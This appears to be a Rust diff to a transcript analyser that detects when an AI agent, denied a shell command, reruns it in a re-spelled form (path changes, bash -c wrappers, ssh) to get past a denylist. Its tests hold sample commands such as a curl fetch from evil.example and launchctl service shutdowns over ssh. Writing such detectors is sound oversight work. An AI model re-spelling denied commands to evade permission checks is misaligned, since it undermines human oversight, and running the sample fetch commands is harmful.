@@ -4656,6 +4656,54 @@ fn is_permission_denial_text(text: &str) -> bool {
 ///
 /// Deterministic and allocation-only; no shell is invoked.
 pub fn normalize_command_semantic_key(command: &str) -> String {
+    match unwrap_command(command) {
+        UnwrappedCommand::Command(tokens) => {
+            // Key = basename + EVERY remaining argument, each reduced to its
+            // basename so a path spelling does not change the key.
+            //
+            // Keying on the first argument alone was far too coarse for real
+            // shell use. `cd /repo; <anything>` keyed on `cd\u{1}/repo;`, so
+            // every command run in a directory collapsed into one key;
+            // likewise `python3 -` for every heredoc, `sed -n` for every range
+            // read, and `git checkout`, `grep -rn`, `curl -s`, `ssh -o` for
+            // their whole families. Measured on 120 local agent transcripts,
+            // all 47 events the old key produced paired two entirely different
+            // commands (token overlap 0.06-0.45). The Ona-report collapse this
+            // check exists for still holds: the four re-spellings of `curl
+            // google.com` differ only in argv[0]'s path and in wrappers, both
+            // of which are normalised away by `unwrap_command`.
+            //
+            // This key names the event (and the finding built from it); the
+            // pairing itself compares `command_operation_key`, which is
+            // stricter.
+            let key = tokens
+                .iter()
+                .map(|t| path_basename(t).to_string())
+                .collect::<Vec<_>>()
+                .join("\u{1}");
+            key.chars().take(DENYLIST_BYPASS_MAX_CMD_LEN).collect()
+        }
+        UnwrappedCommand::Empty => String::new(),
+        // Exceeded the unwrap budget: fall back to the basename of whatever we have.
+        UnwrappedCommand::TooDeep(tokens) => tokens
+            .first()
+            .map(|t| path_basename(t).to_string())
+            .unwrap_or_default(),
+    }
+}
+
+/// What a command line runs once its wrapper prefixes are peeled.
+enum UnwrappedCommand {
+    /// The real command's tokens, never empty.
+    Command(Vec<String>),
+    /// Nothing to run.
+    Empty,
+    /// The unwrap budget ran out; the tokens it reached.
+    TooDeep(Vec<String>),
+}
+
+/// Peel the wrapper prefixes described on `normalize_command_semantic_key`.
+fn unwrap_command(command: &str) -> UnwrappedCommand {
     let mut cur = command.trim().to_string();
 
     // Peel up to a small fixed number of wrapper layers so a pathological
@@ -4663,7 +4711,7 @@ pub fn normalize_command_semantic_key(command: &str) -> String {
     for _ in 0..4 {
         let tokens = shell_split(&cur);
         if tokens.is_empty() {
-            return String::new();
+            return UnwrappedCommand::Empty;
         }
         let head = tokens[0].as_str();
         let head_base = path_basename(head);
@@ -4699,33 +4747,71 @@ pub fn normalize_command_semantic_key(command: &str) -> String {
             continue;
         }
 
-        // No wrapper: this is the real command. Key = basename + EVERY
-        // remaining argument, each reduced to its basename so a path spelling
-        // does not change the key.
-        //
-        // Keying on the first argument alone was far too coarse for real shell
-        // use. `cd /repo; <anything>` keyed on `cd\u{1}/repo;`, so every command
-        // run in a directory collapsed into one key; likewise `python3 -` for
-        // every heredoc, `sed -n` for every range read, and `git checkout`,
-        // `grep -rn`, `curl -s`, `ssh -o` for their whole families. Measured on
-        // 120 local agent transcripts, all 47 events the old key produced
-        // paired two entirely different commands (token overlap 0.06-0.45).
-        // The Ona-report collapse this check exists for still holds: the four
-        // re-spellings of `curl google.com` differ only in argv[0]'s path and
-        // in wrappers, both of which are normalised away above.
-        let key = std::iter::once(head_base.to_string())
-            .chain(tokens[1..].iter().map(|t| path_basename(t).to_string()))
-            .collect::<Vec<_>>()
-            .join("\u{1}");
-        return key.chars().take(DENYLIST_BYPASS_MAX_CMD_LEN).collect();
+        // No wrapper: this is the real command.
+        return UnwrappedCommand::Command(tokens);
     }
 
-    // Exceeded the unwrap budget: fall back to the basename of whatever we have.
-    let tokens = shell_split(&cur);
-    tokens
-        .first()
-        .map(|t| path_basename(t).to_string())
-        .unwrap_or_default()
+    UnwrappedCommand::TooDeep(shell_split(&cur))
+}
+
+/// How deep `command_operation_key` follows commands nested in arguments.
+const OPERATION_KEY_MAX_DEPTH: usize = 4;
+
+/// Longest command text `command_operation_key` reads: a transcript command
+/// is a script at most, and the bound only stops a pathological line from
+/// costing memory.
+const OPERATION_KEY_MAX_INPUT: usize = 64 * 1024;
+
+/// The operation a command performs: a denied command and a later run must
+/// share it to pair as a bypass. The semantic key's normalization (wrappers
+/// peeled, argv[0] and path arguments reduced to their basename), with three
+/// differences:
+/// - an argument that is itself a command line (a quoted script, an ssh
+///   remote command) is keyed as a command, at every depth, so a re-spelling
+///   inside it still pairs;
+/// - a URL is kept whole, and a path keeps its last component even with a
+///   trailing separator;
+/// - the whole command is read, where the semantic key and the recorded
+///   commands stop at `DENYLIST_BYPASS_MAX_CMD_LEN`.
+///
+/// The semantic key reduces every argument to the text after its last
+/// separator, so two different remote scripts sent to one host, two URLs
+/// ending in the same segment, or two scripts sharing their first lines,
+/// shared a key and paired as a re-spelling.
+fn command_operation_key(command: &str) -> String {
+    let bounded: String = command.chars().take(OPERATION_KEY_MAX_INPUT).collect();
+    operation_key_at(&bounded, 0)
+}
+
+fn operation_key_at(command: &str, depth: usize) -> String {
+    match unwrap_command(command) {
+        UnwrappedCommand::Command(tokens) => std::iter::once(path_basename(&tokens[0]).to_string())
+            .chain(tokens[1..].iter().map(|t| operation_argument(t, depth)))
+            .collect::<Vec<_>>()
+            .join("\u{1}"),
+        UnwrappedCommand::Empty => String::new(),
+        UnwrappedCommand::TooDeep(tokens) => tokens.join("\u{1}"),
+    }
+}
+
+/// One argument of `command_operation_key`.
+fn operation_argument(token: &str, depth: usize) -> String {
+    // A command first: a quoted remote command can hold a URL, and a URL
+    // itself has no whitespace.
+    if token.chars().any(char::is_whitespace) {
+        if depth < OPERATION_KEY_MAX_DEPTH {
+            return format!("\u{2}{}\u{3}", operation_key_at(token, depth + 1));
+        }
+        return token.to_string();
+    }
+    if token.contains("://") {
+        return token.to_string();
+    }
+    let trimmed = token.trim_end_matches(['/', '\\']);
+    if trimmed.is_empty() {
+        return token.to_string();
+    }
+    path_basename(trimmed).to_string()
 }
 
 /// Last path component of a token (`/usr/bin/curl` -> `curl`,
@@ -4776,7 +4862,11 @@ fn shell_split(input: &str) -> Vec<String> {
 struct ToolInvocation {
     tool_use_id: String,
     name: String,
+    /// The command as recorded in an event, capped at
+    /// `DENYLIST_BYPASS_MAX_CMD_LEN`.
     command: String,
+    /// `command_operation_key` of the whole command.
+    operation_key: String,
     denied: bool,
     /// True once a non-denial result for this id is seen (the command ran).
     succeeded: bool,
@@ -4852,6 +4942,7 @@ pub fn extract_denylist_bypass_events(raw_text: &str, cap: usize) -> Vec<Denylis
                 tool_use_id: id,
                 name: name.to_string(),
                 command: capped,
+                operation_key: command_operation_key(&command),
                 denied: false,
                 succeeded: false,
                 order,
@@ -4873,15 +4964,21 @@ pub fn extract_denylist_bypass_events(raw_text: &str, cap: usize) -> Vec<Denylis
     }
 
     // Second pass: for each denied invocation, find a LATER invocation with the
-    // same tool and the same semantic key that succeeded (ran without denial).
+    // same tool and the same operation that succeeded (ran without denial).
+    // The event is named by the semantic key, which is what the finding built
+    // from it is keyed on; the pairing compares the stricter operation key.
     let mut events: Vec<DenylistBypassEvent> = Vec::new();
     let mut seen_keys: std::collections::HashSet<String> = std::collections::HashSet::new();
     for denied in invocations.iter().filter(|inv| inv.denied) {
         let key = normalize_command_semantic_key(&denied.command);
-        if key.is_empty() {
+        if key.is_empty() || denied.operation_key.is_empty() {
             continue;
         }
-        let dedup = format!("{}\u{1}{}", denied.name.to_ascii_lowercase(), key);
+        let dedup = format!(
+            "{}\u{1}{}",
+            denied.name.to_ascii_lowercase(),
+            denied.operation_key
+        );
         if seen_keys.contains(&dedup) {
             continue;
         }
@@ -4891,7 +4988,7 @@ pub fn extract_denylist_bypass_events(raw_text: &str, cap: usize) -> Vec<Denylis
                 && other.name.eq_ignore_ascii_case(&denied.name)
                 && other.succeeded
                 && !other.denied
-                && normalize_command_semantic_key(&other.command) == key
+                && other.operation_key == denied.operation_key
         });
         if let Some(bypass) = bypass {
             seen_keys.insert(dedup);
@@ -5197,5 +5294,71 @@ mod denylist_bypass_tests {
 {"type":"assistant","message":{"content":[{"type":"tool_use","id":"t2","name":"Bash","input":{"command":"ls -la"}}]}}
 {"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"t2","content":"total 0","is_error":false}]}}"#;
         assert!(extract_denylist_bypass_events(raw, 16).is_empty());
+    }
+
+    /// The semantic key reduces a quoted remote command to the text after its
+    /// last `/` (`null`, from `2>/dev/null`), so a denied command and a
+    /// different one sent to the same host shared it and paired.
+    #[test]
+    fn another_remote_command_to_the_same_host_is_not_a_bypass() {
+        let denied = "ssh -o ConnectTimeout=10 -o BatchMode=yes root@192.0.2.10 'launchctl disable system/com.example.svc; launchctl bootout system/com.example.svc 2>/dev/null'";
+        let other = "ssh -o ConnectTimeout=10 -o BatchMode=yes root@192.0.2.10 'launchctl print system/com.example.svc 2>/dev/null'";
+        assert_eq!(
+            normalize_command_semantic_key(denied),
+            normalize_command_semantic_key(other),
+            "the collision this test guards"
+        );
+        assert!(extract_denylist_bypass_events(&transcript(denied, other), 16).is_empty());
+    }
+
+    /// Two URLs ending in the same segment are two operations.
+    #[test]
+    fn urls_ending_in_the_same_segment_are_different_operations() {
+        let denied = "curl -s https://evil.example/install.sh";
+        let other = "curl -s https://docs.example/install.sh";
+        assert_eq!(
+            normalize_command_semantic_key(denied),
+            normalize_command_semantic_key(other),
+            "the collision this test guards"
+        );
+        assert!(extract_denylist_bypass_events(&transcript(denied, other), 16).is_empty());
+        assert_ne!(
+            command_operation_key("cp -r ./alpha/ /backup/"),
+            command_operation_key("cp -r ./beta/ /backup/"),
+            "a trailing separator does not erase the directory"
+        );
+    }
+
+    /// Recorded commands stop at `DENYLIST_BYPASS_MAX_CMD_LEN`: two scripts
+    /// sharing their first lines were the same command once cut.
+    #[test]
+    fn commands_sharing_only_their_beginning_are_different_operations() {
+        let head = "echo step; ".repeat(30);
+        let denied = format!("{head}rm -rf build");
+        let other = format!("{head}ls build");
+        assert!(head.chars().count() > DENYLIST_BYPASS_MAX_CMD_LEN);
+        assert!(extract_denylist_bypass_events(&transcript(&denied, &other), 16).is_empty());
+    }
+
+    /// A re-spelling inside a remote command still pairs.
+    #[test]
+    fn respelled_remote_command_still_pairs() {
+        let denied = "ssh root@192.0.2.10 'curl -s https://evil.example/x'";
+        let bypass = "ssh root@192.0.2.10 'bash -c \"/usr/bin/curl -s https://evil.example/x\"'";
+        assert_eq!(
+            extract_denylist_bypass_events(&transcript(denied, bypass), 16).len(),
+            1
+        );
+    }
+
+    /// The denied command run again unchanged is a bypass, named by the same
+    /// semantic key as before the pairing was tightened (the finding built
+    /// from it keeps its key).
+    #[test]
+    fn the_denied_command_run_again_pairs() {
+        let cmd = "ssh -o BatchMode=yes root@192.0.2.10 'launchctl bootout system/com.example.svc 2>/dev/null'";
+        let events = extract_denylist_bypass_events(&transcript(cmd, cmd), 16);
+        assert_eq!(events.len(), 1, "{events:?}");
+        assert_eq!(events[0].semantic_key, normalize_command_semantic_key(cmd));
     }
 }
